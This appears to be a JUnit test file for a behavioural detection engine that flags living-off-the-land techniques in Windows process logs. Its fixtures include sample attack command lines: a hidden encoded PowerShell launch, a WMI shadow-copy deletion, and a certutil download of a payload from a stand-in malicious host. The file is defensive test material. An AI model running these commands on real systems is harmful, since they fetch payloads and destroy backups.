package com.example.loldetector.detection;

import com.example.loldetector.detection.rules.CertutilRule;
import com.example.loldetector.detection.rules.PowerShellRule;
import com.example.loldetector.detection.rules.WmiRule;
import com.example.loldetector.dto.LogEventDto;
import com.example.loldetector.entity.SecurityAlert;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.time.LocalDateTime;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class BehavioralDetectionEngineTest {

    private BehavioralDetectionEngine engine;

    @BeforeEach
    void setUp() {
        List<DetectionRule> rules = List.of(
                new PowerShellRule(),
                new WmiRule(),
                new CertutilRule()
        );
        engine = new BehavioralDetectionEngine(rules);
    }

    @Test
    @DisplayName("Scenario A: PowerShell stealth encoded command triggers RULE-PS-001 with HIGH severity")
    void testPowerShellDetection() {
        LogEventDto event = new LogEventDto(
                "EVT-PS-101",
                LocalDateTime.now(),
                "powershell.exe",
                "cmd.exe",
                "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...",
                "NT AUTHORITY\\SYSTEM",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        );

        List<SecurityAlert> alerts = engine.analyzeEvents(List.of(event));

        assertEquals(1, alerts.size());
        SecurityAlert alert = alerts.get(0);
        assertEquals("RULE-PS-001", alert.getRuleId());
        assertEquals("HIGH", alert.getSeverity());
        assertEquals("T1059.001", alert.getMitreTechniqueId());
    }

    @Test
    @DisplayName("Scenario B: WMI shadow copy deletion triggers RULE-WMI-001 with CRITICAL severity")
    void testWmiDetection() {
        LogEventDto event = new LogEventDto(
                "EVT-WMI-102",
                LocalDateTime.now(),
                "wmic.exe",
                "powershell.exe",
                "wmic.exe shadowcopy delete",
                "NT AUTHORITY\\SYSTEM",
                "C:\\Windows\\System32\\wbem\\wmic.exe"
        );

        List<SecurityAlert> alerts = engine.analyzeEvents(List.of(event));

        assertEquals(1, alerts.size());
        SecurityAlert alert = alerts.get(0);
        assertEquals("RULE-WMI-001", alert.getRuleId());
        assertEquals("CRITICAL", alert.getSeverity());
        assertEquals("T1047", alert.getMitreTechniqueId());
    }

    @Test
    @DisplayName("Scenario C: Certutil urlcache download triggers RULE-CERT-001 with HIGH severity")
    void testCertutilDetection() {
        LogEventDto event = new LogEventDto(
                "EVT-CERT-103",
                LocalDateTime.now(),
                "certutil.exe",
                "cmd.exe",
                "certutil.exe -urlcache -split -f http://malicious.org/payload.png payload.exe",
                "CORP\\Admin",
                "C:\\Windows\\System32\\certutil.exe"
        );

        List<SecurityAlert> alerts = engine.analyzeEvents(List.of(event));

        assertEquals(1, alerts.size());
        SecurityAlert alert = alerts.get(0);
        assertEquals("RULE-CERT-001", alert.getRuleId());
        assertEquals("HIGH", alert.getSeverity());
        assertEquals("T1105", alert.getMitreTechniqueId());
    }

    @Test
    @DisplayName("Benign events should not trigger any detection rules (Zero False Positives)")
    void testBenignEventsNoAlerts() {
        LogEventDto benignPs = new LogEventDto(
                "EVT-BENIGN-1",
                LocalDateTime.now(),
                "powershell.exe",
                "explorer.exe",
                "powershell.exe Get-Process",
                "CORP\\User",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        );

        LogEventDto benignWmi = new LogEventDto(
                "EVT-BENIGN-2",
                LocalDateTime.now(),
                "wmic.exe",
                "cmd.exe",
                "wmic.exe cpu get name",
                "CORP\\User",
                "C:\\Windows\\System32\\wbem\\wmic.exe"
        );

        List<SecurityAlert> alerts = engine.analyzeEvents(List.of(benignPs, benignWmi));

        assertTrue(alerts.isEmpty(), "Benign administrative commands should not trigger security alerts");
    }
}
